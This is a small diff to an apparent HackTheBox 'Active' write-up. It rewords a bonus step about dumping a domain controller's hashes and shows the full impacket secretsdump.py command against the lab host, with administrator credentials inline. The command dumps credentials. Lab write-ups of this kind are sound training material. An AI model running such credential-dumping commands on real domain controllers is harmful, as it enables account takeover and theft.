@@ -492,7 +492,7 @@ Tunnel adapter isatap.{B3FEC2C7-47CA-4014-A441-A3A5CDDC983C}:
 
 ## Bonus 
 
- Get the hashes with secretsdump.py:
+ Dump  the hashes of domain controller with secretsdump.py:
 
 ```bash
 dumbland () hackthebox/active/recon :: /home/dumb/tools/impacket/examples/secretsdump.py active.htb/administrator:Ticketmaster1968@10.10.10.100
